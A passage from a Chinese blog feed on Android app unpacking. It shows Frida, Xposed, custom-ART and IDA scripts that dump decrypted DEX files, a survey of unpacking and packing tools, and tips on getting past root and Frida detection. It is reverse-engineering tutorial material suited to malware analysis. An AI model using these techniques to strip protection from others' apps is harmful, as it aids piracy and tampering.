class=\"line\">                   <span class=\"keyword\">var</span> longvalue = <span class=\"title class_\">Array</span>.<span class=\"title function_\">getLong</span>(mCookie,i);</span><br><span class=\"line\">                   <span class=\"keyword\">var</span> dexfilestr = <span class=\"title function_\">ptr</span>(longvalue + <span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">                   <span class=\"comment\">//console.log(dexfilestr);</span></span><br><span class=\"line\">                   <span class=\"title function_\">savedexfile</span>(dexfilestr)</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">               </span><br><span class=\"line\">           &#125;,<span class=\"attr\">onComplete</span>:<span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">               <span class=\"variable language_\">console</span>.<span class=\"title function_\">warn</span>(<span class=\"string\">&quot;Search DexFile over!&quot;</span>);</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">       &#125;) </span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"1-1-2-FRIDA-DEXDump\"><a href=\"#1-1-2-FRIDA-DEXDump\" class=\"headerlink\" title=\"1.1.2 FRIDA-DEXDump\"></a>1.1.2 FRIDA-DEXDump</h5><p>葫芦娃大佬的框架针对第一代壳也十分好用，不想自己编写脚本的朋友，可以直接使用工具</p>\n<p>工具链接：<a href=\"https://github.com/hluwa/frida-dexdump\">FRIDA-DEXDump</a></p>\n<p>使用说明：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/1.png\"></p>\n<p>我们简单演示一下，这里结合objection一起使用</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/2.png\" alt=\"image-20221016154708131\"></p>\n<h5 id=\"1-1-3-缺陷\"><a href=\"#1-1-3-缺陷\" class=\"headerlink\" title=\"1.1.3 缺陷\"></a>1.1.3 缺陷</h5><p>使用Frida的脱壳方式，需要root和frida两个要求，但是现在很多设备会对root进行检测以及frida进行检测，这样使得这种方式就不能很好的处理，当然针对root检测和frida检测都有相应的对抗方式，比如定制root以及定制frida，但是这样都比较麻烦。</p>\n<h4 id=\"1-2-Xposed\"><a href=\"#1-2-Xposed\" class=\"headerlink\" title=\"1.2 Xposed\"></a>1.2 Xposed</h4><p>比如这里我们遇到frida检测了，我们还可以在我们的设备上安装Xposed，通过编写Xposed模块来进行脱壳，Xposed脱壳原理和frida没有区别，只是编程语言有差异而已，这里我们直接给出一些已经开源的Xposed的模块</p>\n<p>Xposed的安装十分简单：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">(<span class=\"number\">1</span>) <span class=\"number\">4.4</span>以下Android版本安装比较简单，只需要两步即可</span><br><span class=\"line\">    <span class=\"number\">1.</span>对需要安装Xposed的手机进行root</span><br><span class=\"line\">    <span class=\"number\">2.</span>下载并安装xposedInstaller,之后授权其root权限，进入app点击安装即可</span><br><span class=\"line\">    但是由于官网不在维护，导致无法直接通过xposedinstaller下载补丁包</span><br><span class=\"line\">（<span class=\"number\">2</span>）Android <span class=\"number\">5.0</span>-<span class=\"number\">8.0</span> 由于<span class=\"number\">5.0</span>后出现ART，所以安装步骤分成两个部分：xposed.zip 和</span><br><span class=\"line\">    XposedInstaller.apk,zip文件是框架主体，需要进入Recovery后刷入，apk文件用于Xposed管理</span><br><span class=\"line\">    <span class=\"number\">1.</span>完成对手机的root，并刷入reconvery(比如twrp),使用Superroot</span><br><span class=\"line\">    <span class=\"number\">2.</span>下载你对应的zip补丁包，并进入recovery刷入</span><br><span class=\"line\">    <span class=\"number\">3.</span>重启手机，安装xposedInstaller并授予root权限即可</span><br><span class=\"line\">    官网地址：https:<span class=\"comment\">//dl-xda.xposed.info/framework/</span></span><br><span class=\"line\">（<span class=\"number\">3</span>）由于Android <span class=\"number\">8.0</span>后，Xposed官方作者没有再对其更新，我们一般就使用国内大佬riyu的Edxposed框架</span><br><span class=\"line\">    Magisk + riyu + Edxposed</span><br></pre></td></tr></table></figure>\n\n<p>这里收集了网上开源的Xposed脱壳模块，其中以FDex2和反射大师较为经典</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/3.png\" alt=\"image-20221016155539952\"></p>\n<p>这里我们拿反射大师为例：</p>\n<h5 id=\"1-2-1-反射大师\"><a href=\"#1-2-1-反射大师\" class=\"headerlink\" title=\"1.2.1 反射大师\"></a>1.2.1 反射大师</h5><p>反射大师的使用流程十分简单，首先我们安装Xposed并装上反射大师的模块，打开反射大师</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/8.png\" alt=\"image-20221016191354324\"></p>\n<p>我们选择要脱壳的目标进程</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/9.png\" alt=\"image-20221016191430678\"></p>\n<p>然后我们再次打开目标进程，点击中间的六芒星，然后选择当前Activity</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/10.png\" alt=\"image-20221016191545887\"></p>\n<p>然后我们写出Dex，就可以脱下dex文件，并在保存路径中可以拿出来</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/11.png\" alt=\"image-20221016191641937\"></p>\n<h5 id=\"1-2-2-FDex2\"><a href=\"#1-2-2-FDex2\" class=\"headerlink\" title=\"1.2.2 FDex2\"></a>1.2.2 FDex2</h5><p>FDex2的原理更加简单，利用两个可导出的api<code>getDex、getBytes</code>，使用流程也十分简单，直接单开选择目标进程hook即可</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/12.png\" alt=\"image-20221016191838251\"></p>\n<h5 id=\"1-2-3-缺陷\"><a href=\"#1-2-3-缺陷\" class=\"headerlink\" title=\"1.2.3 缺陷\"></a>1.2.3 缺陷</h5><p>Xposed的安装较frida麻烦，最主要遇到检测Xposed的样本可能就无法使用，但是我们也可以对Xposed进行定制</p>\n<h4 id=\"1-3-Xposed-Frida\"><a href=\"#1-3-Xposed-Frida\" class=\"headerlink\" title=\"1.3 Xposed+Frida\"></a>1.3 Xposed+Frida</h4><h5 id=\"1-3-1-DITOR\"><a href=\"#1-3-1-DITOR\" class=\"headerlink\" title=\"1.3.1 DITOR\"></a>1.3.1 DITOR</h5><p>我们知道除了Xposed现在还有很多frida持久化的方案，这里我们就是一个支持Xposed动态注入和frida注入的模块</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/38.png\" alt=\"image-20221020113606544\"></p>\n<p>这里你可以选择动态注入但是安装Xposed，你也可以选择frida注入，后面我们演示了xposed，这里我们主要演示frida</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/39.png\" alt=\"image-20221020113800032\"></p>\n<p>你可以选择内置脚本，自己也可以将我们前面写的脱壳脚本上传，这里我们就选内置脚本</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/40.png\" alt=\"image-20221020113848991\"></p>\n<p>选择一个脚本，配置成功，我们可以选择对应的模式，这里不同模式针对不同壳，这里我就选择通用模式</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/41.png\" alt=\"image-20221020113953291\"></p>\n<p>然后就可以脱壳成功，这里如果不成功可能是系统与脱壳脚本不匹配等问题</p>\n<h3 id=\"2-场景2\"><a href=\"#2-场景2\" class=\"headerlink\" title=\"2.场景2\"></a>2.场景2</h3><p>此时你拿到一些样本，你发现这个样本检测frida、检测Xposed、检测root，然后你不知道如何解决</p>\n<h4 id=\"2-1-Fart\"><a href=\"#2-1-Fart\" class=\"headerlink\" title=\"2.1 Fart\"></a>2.1 Fart</h4><p>Fart是寒冰大佬定制的针对Art的主动调用脱壳机，适用于一代壳和二代抽取壳</p>\n<p>Fart现在开源出来的版本包含：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Fart原始版：无法应对root检测</span><br><span class=\"line\">Fart8：抹除了指纹，可以应对root检测</span><br></pre></td></tr></table></figure>\n\n<p>Fart的使用很简单，可以配合寒冰大佬的定制版jadx来进行恢复抽取壳，本文主要针对第一代壳的解决</p>\n<p>使用说明：<a href=\"https://github.com/hanbinglengyue/FART\">https://github.com/hanbinglengyue/FART</a></p>\n<h4 id=\"2-2-定制化系统\"><a href=\"#2-2-定制化系统\" class=\"headerlink\" title=\"2.2 定制化系统\"></a>2.2 定制化系统</h4><p>我们学习Fart的原理，可以发现第一代壳的定制化是很容易实现的，是在一些脱壳点进行插桩，然后保存dex，例如LoadMethod、DexFile等等</p>\n<p>我们在<a href=\"https://bbs.pediy.com/thread-269575.htm\">源码编译（1）——Android6.0源码编译详解</a>中已经讲述了如何编译源码，接下来我们进行插桩脱壳</p>\n<p>同理、还是定位脱壳点，我们还是随便定位一个脱壳点LoadMethod 然后进行插桩</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/4.png\" alt=\"image-20220613220518548\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//add</span></span><br><span class=\"line\"><span class=\"type\">char</span> dexfilepath[<span class=\"number\">100</span>]=<span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"built_in\">memset</span>(dexfilepath,<span class=\"number\">0</span>,<span class=\"number\">100</span>);</span><br><span class=\"line\"><span class=\"built_in\">sprintf</span>(dexfilepath,<span class=\"string\">&quot;%d_%zu_LoadMethod.dex&quot;</span>,<span class=\"built_in\">getpid</span>(),dex_file.<span class=\"built_in\">Size</span>());</span><br><span class=\"line\"><span class=\"type\">int</span> dexfd = <span class=\"built_in\">open</span>(dexfilepathm,O_CREAT|O_RDWR,<span class=\"number\">666</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(dexfd&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> result = <span class=\"built_in\">write</span>(dexfd,dex_file.<span class=\"built_in\">Begin</span>(),dex_file.<span class=\"built_in\">Size</span>());</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(result&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">close</span>(dexfd);</span><br><span class=\"line\">\t\t<span class=\"built_in\">LOG</span>(WARNING)&lt;&lt;<span class=\"string\">&quot;LoadMethod&quot;</span>&lt;&lt;dexfilepath;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//add</span></span><br></pre></td></tr></table></figure>\n\n<p>同理我们在<code>execute</code>同样插桩此段代码，最后进行编译，编译成功</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/5.png\" alt=\"image-20220613172222202\"></p>\n<p>然后给程序授权sdcard权限，再次启动应用，就可以看见脱取的dex文件就保存在sdcard目录下</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/6.png\" alt=\"image-20220613215956911\"></p>\n<p>再次将sdcard下dex文件打开，这里我们已经看见了8732435这个文件，再次打开脱取成功</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/7.png\" alt=\"image-20220613172222202\"></p>\n<h4 id=\"2-3缺陷\"><a href=\"#2-3缺陷\" class=\"headerlink\" title=\"2.3缺陷\"></a>2.3缺陷</h4><p>定制系统的方法对抗一代壳还是十分适用的，不过缺点是定制系统流程较为复杂，而且复杂的壳还可以通过检验crc码、对write进行hook来进行对抗</p>\n<h3 id=\"3-场景3\"><a href=\"#3-场景3\" class=\"headerlink\" title=\"3.场景3\"></a>3.场景3</h3><p>假如我们现在不想定制系统，样本也进行frida、Xposed的强检测</p>\n<h4 id=\"3-1动态调试\"><a href=\"#3-1动态调试\" class=\"headerlink\" title=\"3.1动态调试\"></a>3.1动态调试</h4><p>我们可以使用IDA、GDB进行动态调试，原理还是一样，找到脱壳点，编写相应的脚本即可</p>\n<p>所谓动态调试法，核心原理和上面一样，就是我们在动态调试的过程中找到DexFile的起始地址和大小，然后执行脚本进行dump</p>\n<p>首先选取脱壳点，我们还是选择<code>DexFile::DexFile</code></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/13.png\" alt=\"image-20220613210130186\"></p>\n<p>动态调试的步骤我在前面的文章中已经做了详细的讲解，不会的朋友去看前面的文章</p>\n<p>首先我们启动android_server</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/14.png\" alt=\"image-20220613194111711\"></p>\n<p>然后我们附加上进程</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/15.png\" alt=\"image-20220613194326114\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/16.png\" alt=\"image-20220613195349008\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/17.png\" alt=\"image-20220613203024990\"></p>\n<p>然后我们打开libart.so，并定位到DexFile::DexFile</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/18.png\" alt=\"image-20220613210859021\"></p>\n<p>然后在该函数下断点，然后F9过来</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/19.png\" alt=\"image-20220613211145356\"></p>\n<p>此处我们就可以很明显看到X1就是我们的起始地址，X4是我们的偏移值</p>\n<p>编写脚本进行hook</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span>&#123;    </span><br><span class=\"line\"> <span class=\"keyword\">auto</span> fp, begin, end, dexbyte;      </span><br><span class=\"line\"> fp = <span class=\"built_in\">fopen</span>(<span class=\"string\">&quot;d:\\\\dump.dex&quot;</span>, <span class=\"string\">&quot;wb+&quot;</span>);      </span><br><span class=\"line\"> begin =  <span class=\"number\">0x76FCD93020</span>;    </span><br><span class=\"line\"> end = begin + <span class=\"number\">0x7EEC5600</span>; </span><br><span class=\"line\"> <span class=\"keyword\">for</span> ( dexbyte = begin; dexbyte&lt;end;dexbyte++)</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\"> <span class=\"built_in\">fputc</span>(<span class=\"built_in\">Byte</span>(dexbyte), fp);        </span><br><span class=\"line\"> &#125;   </span><br><span class=\"line\"> </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/20.png\" alt=\"image-20220613214647627\"></p>\n<p>直接运行run</p>\n<p>然后我们查看dump.dex文件</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/42.png\" alt=\"image-20220613215148251\"></p>\n<p>我们可以发现这里是代理类，还没有到我们想要的dex，我们再次F9，再次到这里，地址再次改变，再次结合长度来计算，我们每次计算可以取小点值，先试一下</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/22.png\" alt=\"image-20220613215343895\"></p>\n<p>发现还是不是，我们需要不停测试直到dump出dex为此</p>\n<p>这里大家可以下去按照此方法尝试，或者换一个脱壳点来尝试</p>\n<h4 id=\"3-2缺陷\"><a href=\"#3-2缺陷\" class=\"headerlink\" title=\"3.2缺陷\"></a>3.2缺陷</h4><p>动态调试的方式遇到强反调的样本，就无法很好的使用了</p>\n<h3 id=\"4-场景4\"><a href=\"#4-场景4\" class=\"headerlink\" title=\"4.场景4\"></a>4.场景4</h3><p>假如我们的手机连root都无法做到，现在就是一个未解锁的正常手机，如何应对</p>\n<h4 id=\"4-1BlackDex\"><a href=\"#4-1BlackDex\" class=\"headerlink\" title=\"4.1BlackDex\"></a>4.1BlackDex</h4><p>BlackDex利用虚拟化的技术，也就是IO重定向，原理和Vitualbox一致，好处是无需root，无需hook可以进行脱壳</p>\n<p>我们打开BlackDex</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/23.png\" alt=\"image-20221016193325544\"></p>\n<p>我们只需要点击相应的应用，就可以进行脱壳</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/24.png\" alt=\"image-20221016193358469\"></p>\n<h4 id=\"4-2-MT管理器\"><a href=\"#4-2-MT管理器\" class=\"headerlink\" title=\"4.2 MT管理器\"></a>4.2 MT管理器</h4><p>MT管理器是一个功能十分强大的逆向工具，一键傻瓜式逆向，收费不过相对偏移，可以针对简易的壳一键脱壳</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/27.png\" alt=\"image-20221016194126560\"></p>\n<h4 id=\"4-3-NP管理器\"><a href=\"#4-3-NP管理器\" class=\"headerlink\" title=\"4.3 NP管理器\"></a>4.3 NP管理器</h4><p>NP管理器类似MT管理器，同样功能十分强大，关键是不收费，没错作者很nice，免费！！！</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/28.png\" alt=\"image-20221016194657276\"></p>\n<p>同样是功能十分的强大，还有加壳，绕过反调，去签等各种功能</p>\n<h4 id=\"4-2缺陷\"><a href=\"#4-2缺陷\" class=\"headerlink\" title=\"4.2缺陷\"></a>4.2缺陷</h4><p>这种方法十分适用，但难以应对虚拟化检测的样本，也无法解决后面的加壳技术</p>\n<h3 id=\"5-场景5\"><a href=\"#5-场景5\" class=\"headerlink\" title=\"5.场景5\"></a>5.场景5</h3><p>假如我们还是正常的手机，无法root，但是我们想要获得hook、root等一些操作，而且适配更多系统</p>\n<h4 id=\"5-1-手机虚拟机（VMOS）-Magisk-Xposed\"><a href=\"#5-1-手机虚拟机（VMOS）-Magisk-Xposed\" class=\"headerlink\" title=\"5.1 手机虚拟机（VMOS）+Magisk+Xposed\"></a>5.1 手机虚拟机（VMOS）+Magisk+Xposed</h4><p>VMOS是一款手机虚拟机，让你无需root，自由切换安卓系统，一键开通root和Xposed权限，结合我们前面的脱壳模块，彻底掌握傻瓜式脱壳的快乐</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/29.png\" alt=\"image-20221020111259647\"></p>\n<p>VMOS可以提供不同版本的Android系统虚拟机，你可以根据需求来使用，这里我们拿Android7.1版来举例实操</p>\n<p>开启虚拟机已经支持了Xposed和root权限，我们再安装上wifiadb，就可以十分方便的进行逆向工作了</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/30.png\" alt=\"image-20221020112024592\"></p>\n<p>我们测试一下root权限</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/31.png\" alt=\"image-20221020112322217\"></p>\n<p>然后这里我们使用DITOR的脱壳模块进行快速脱壳</p>\n<p>打开模块，我们可以选择动态注入就是Xposed，以及此模块还支持frida注入，但是虚拟机不支持frida，这里我们就选择动态注入</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/32.png\" alt=\"image-20221020112203767\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/33.png\"></p>\n<p>这里我们选择需要脱壳的目标应用，这里就选第一个</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/34.png\" alt=\"image-20221020112749115\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/35.png\" alt=\"image-20221020112810032\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/36.png\" alt=\"image-20221020112840431\"></p>\n<p>然后我们把保存的dex打开</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/37.png\" alt=\"image-20221020112930742\"></p>\n<p>成功的脱壳，这样是不是脱壳工作变得十分简单了</p>\n<h4 id=\"5-2手机虚拟机（光速）-Magisk-Xposed\"><a href=\"#5-2手机虚拟机（光速）-Magisk-Xposed\" class=\"headerlink\" title=\"5.2手机虚拟机（光速）+Magisk+Xposed\"></a>5.2手机虚拟机（光速）+Magisk+Xposed</h4><p>我们可以安装手机虚拟机，例如光遇虚拟机，然后在虚拟机中安装Magisk，安装Xposed，这样我们就可以使用前面功能，还可以应对更多场景</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/25.png\" alt=\"image-20221016193759059\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer4/26.png\" alt=\"image-20221016193834221\"></p>\n<p>这样是不是一些有Magisk需求的朋友也可以快速的进行使用了</p>\n<h4 id=\"5-3-缺陷\"><a href=\"#5-3-缺陷\" class=\"headerlink\" title=\"5.3 缺陷\"></a>5.3 缺陷</h4><p>在一些场景还是受限，比如无法支持frida等</p>\n<h2 id=\"三、总结\"><a href=\"#三、总结\" class=\"headerlink\" title=\"三、总结\"></a>三、总结</h2><p>本文针对第一代壳的工具进行了整理和收集，助力大家进行快速的工作，本文的工具整理并上传知识星球，大家也可以前往微信公众号（安全后厨）回复：脱壳工具集，来获取工具集</p>\n<p>后续也会上传github</p>\n<p>github：<a href=\"https://github.com/WindXaa/Android-reverse\">https://github.com/WindXaa/Android-reverse</a></p>\n","categories":["Android加壳与脱壳"],"tags":["逆向技术","加壳与脱壳"]},{"title":"Android加壳与脱壳（6）——各类加壳器与原理分析推荐","url":"/2022/12/04/Packer6/","content":"<h2 id=\"1-前言\"><a href=\"#1-前言\" class=\"headerlink\" title=\"1.前言\"></a>1.前言</h2><p>为了方便编写Android加壳与脱壳系列的文章，今天收集整理了网络上实用的加壳器和分析文章，本文推荐的加壳器框架都进行了一一的复现，所以方便大家的学习。</p>\n<span id=\"more\"></span>\n<h2 id=\"2-项目推荐\"><a href=\"#2-项目推荐\" class=\"headerlink\" title=\"2.项目推荐\"></a>2.项目推荐</h2><h3 id=\"2-1-加壳的发展史\"><a href=\"#2-1-加壳的发展史\" class=\"headerlink\" title=\"2.1 加壳的发展史\"></a>2.1 加壳的发展史</h3><p>我们纵观Android加固主要分为dex加壳和so加固，本文主要描述dex加壳的发展史</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer6/1.png\"></p>\n<p>即总共可以包括：动态加载壳、不落地加载壳、函数抽取壳、dex2c壳、dex-vmp壳</p>\n<p>五类加壳各自具有不同的特点，而技术难度也是逐步的增加，下面将给大家推荐网上开源的五类加壳器，方便大家的学习整理</p>\n<h3 id=\"2-2-动态加载壳\"><a href=\"#2-2-动态加载壳\" class=\"headerlink\" title=\"2.2 动态加载壳\"></a>2.2 动态加载壳</h3><p>加壳器：</p>\n<p>这里原作者的项目好像删除了，可以使用这里我重新编译出来的框架</p>\n<p><a href=\"https://github.com/WindXaa/Android-reverse/tree/main/Android%E7%AE%80%E6%98%93%E5%8A%A0%E5%A3%B3%E5%99%A8\">https://github.com/WindXaa/Android-reverse/tree/main/Android%E7%AE%80%E6%98%93%E5%8A%A0%E5%A3%B3%E5%99%A8</a></p>\n<p>分析文章：</p>\n<p><a href=\"https://mp.weixin.qq.com/s/LWTFNDV1dff8cdBakd1AOQ\">https://mp.weixin.qq.com/s/LWTFNDV1dff8cdBakd1AOQ</a></p>\n<p>动态加载壳比较简单，但缺点是容易将dex解密后释放在本地</p>\n<h3 id=\"2-3-不落地加载壳\"><a href=\"#2-3-不落地加载壳\" class=\"headerlink\" title=\"2.3 不落地加载壳\"></a>2.3 不落地加载壳</h3><p>加壳器：<a href=\"https://github.com/Frezrik/Jiagu\">https://github.com/Frezrik/Jiagu</a></p>\n<p>该作者实现了通用的不落地加载壳的加壳器，不落地加载主要是为了对抗前文的缺点，这里通过在Android8.0前后采用不同的方案进行实现</p>\n<p>分析文章：</p>\n<p><a href=\"https://blog.csdn.net/z9722/article/details/120785602\">https://blog.csdn.net/z9722/article/details/120785602</a></p>\n<p>更详细的分析文章关注公众号</p>\n<h3 id=\"2-4-函数抽取壳\"><a href=\"#2-4-函数抽取壳\" class=\"headerlink\" title=\"2.4 函数抽取壳\"></a>2.4 函数抽取壳</h3><p>加壳器：<a href=\"https://github.com/luoyesiqiu/dpt-shell\">https://github.com/luoyesiqiu/dpt-shell</a></p>\n<p>函数抽取壳的粒度更细，可以对抗前面整体加壳的方式</p>\n<p>分析文章：</p>\n<p><a href=\"https://bbs.pediy.com/thread-271139.htm\">https://bbs.pediy.com/thread-271139.htm</a></p>\n<h3 id=\"2-5-dex2c壳\"><a href=\"#2-5-dex2c壳\" class=\"headerlink\" title=\"2.5 dex2c壳\"></a>2.5 dex2c壳</h3><p>加壳器：<a href=\"https://github.com/amimo/dcc\">https://github.com/amimo/dcc</a></p>\n<p>dex2c壳开始从java层向so层进行转换，主要通过反编译，然后通过C&#x2F;C++将java层的代码翻译过来，这样特点是绑定在不同的函数地址上</p>\n<p>分析文章：</p>\n<p>暂时未看见不错的分析文章，后面团队会编写相关原理文章</p>\n<h3 id=\"2-6-dex-vmp壳\"><a href=\"#2-6-dex-vmp壳\" class=\"headerlink\" title=\"2.6 dex-vmp壳\"></a>2.6 dex-vmp壳</h3><p>加壳器：<a href=\"https://github.com/maoabc/nmmp\">https://github.com/maoabc/nmmp</a></p>\n<p>dex-vmp通过大量的jni接口反射将java代码反射到so层，然后在so层通过自定义的解释器去解释，特点是函数都注册在相同的地址上</p>\n<p>分析文章：</p>\n<p><a href=\"https://bbs.pediy.com/thread-270799.htm\">https://bbs.pediy.com/thread-270799.htm</a></p>\n<p><a href=\"https://nemozqqz.github.io/2022/06/15/VMProtect-and-Android-DEX-VMP.html\">https://nemozqqz.github.io/2022/06/15/VMProtect-and-Android-DEX-VMP.html</a></p>\n<h2 id=\"3-总结\"><a href=\"#3-总结\" class=\"headerlink\" title=\"3.总结\"></a>3.总结</h2><p>本文收集总结了网络上开源且可以复现的加壳器框架和分析文章，这里帮助大家学习，论坛上面也存在很多不错的分析文章，大家可以一一阅读，后面也会对该部分进行一一的分析，感兴趣朋友可以关注github</p>\n<p>github：<a href=\"https://github.com/WindXaa/Android-reverse\">https://github.com/WindXaa/Android-reverse</a></p>\n","categories":["Android加壳与脱壳"],"tags":["逆向技术","加壳与脱壳"]},{"title":"Android加壳与脱壳（7）——Fdex2源码解析和frida版本实现","url":"/2022/12/04/Packer7/","content":"<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>本实验主要是解析Fdex2源码解析和实现frida版本的Fdex2，Fdex2是一个针对第一代壳整体加壳的脱壳框架，不需要通过定位so层中的地址，仅仅只需要在java层就可以实现对第一代壳的脱去，主要是利用两个函数<code>getBytes()</code>和<code>getDex()</code>，目前仅仅针对于Android 7.0及以下版本，缺点：如果一些壳不经过loadClass这个流程，就无法脱下来</p>\n<span id=\"more\"></span>\n<p>本文实验分为两个版本：Android7.0及以下使用frida_fdex2、Android8.0及以上使用dumpDexByCookie.js来实现</p>\n<p>本文收集的参考博客：</p>\n<p><a href=\"http://www.juziss.cn/2020/09/22/app%E7%9A%84%E5%8A%A0%E5%A3%B3%E4%B8%8E%E8%84%B1%E5%A3%B3/\">app的加壳与脱壳</a>——此博客主要讲述看雪2w班的相关知识，十分的详细，建议仔细详细读</p>\n<p><a href=\"https://bbs.pediy.com/thread-252284.htm\">Android万能脱壳机 </a>——此博客主要提出两种主流脱壳思路，第一种思路为本文mCooike实现</p>\n<p><a href=\"https://f5.pm/go-29363.html\">Frida写抽取壳</a>——用Frida写抽取壳的学习</p>\n<p><a href=\"https://kevinspider.github.io/fridahookso/\">frida hook so文件笔记总结</a>——看雪2w班frida hook的学习笔记很详细，建议阅读</p>\n<p><a href=\"https://github.com/AlienwareHe/RDex\">RDex</a>——和本文实现思路一致</p>\n<p><a href=\"https://www.anquanke.com/post/id/219094\">FART脱壳机流程分析</a>——对FART脱壳机流程的解析</p>\n<p><a href=\"https://blog.csdn.net/yangxi_pekin/article/details/53432094\">Dex脱壳格式详解</a>——对Dex格式解析很清楚</p>\n<h2 id=\"二、Fdex2原理解析\"><a href=\"#二、Fdex2原理解析\" class=\"headerlink\" title=\"二、Fdex2原理解析\"></a>二、Fdex2原理解析</h2><h3 id=\"1-原理解析\"><a href=\"#1-原理解析\" class=\"headerlink\" title=\"1.原理解析\"></a>1.原理解析</h3><p>android中的java.lang.Class类拥有一个方法<code>public native Dex getDex();</code>，这意味着我们能通过Class对象的<code>getDex</code>方法获取到<code>Dex</code>对象，<code>Dex</code>类中有一个方法<code>public byte[] getBytes()</code>，我们能通过此方法获取获取该class对象关联的dex数据。这里采用的是Xposed去hook应用的<code>ClassLoader.loadClass</code>方法区dump解密后的dex数据</p>\n<h3 id=\"2-getBytes-和getDex-作用\"><a href=\"#2-getBytes-和getDex-作用\" class=\"headerlink\" title=\"2.getBytes()和getDex()作用\"></a>2.getBytes()和getDex()作用</h3><h4 id=\"（1）getDex\"><a href=\"#（1）getDex\" class=\"headerlink\" title=\"（1）getDex()\"></a>（1）getDex()</h4><p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer7/1.png\" alt=\"image-20211213153933934\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer7/2.png\" alt=\"image-20211213161523790\"></p>\n<p>通过<code>getDex()</code>来反射调用获得Dex类</p>\n<h4 id=\"（2）getBytes\"><a href=\"#（2）getBytes\" class=\"headerlink\" title=\"（2）getBytes()\"></a>（2）getBytes()</h4><p><img 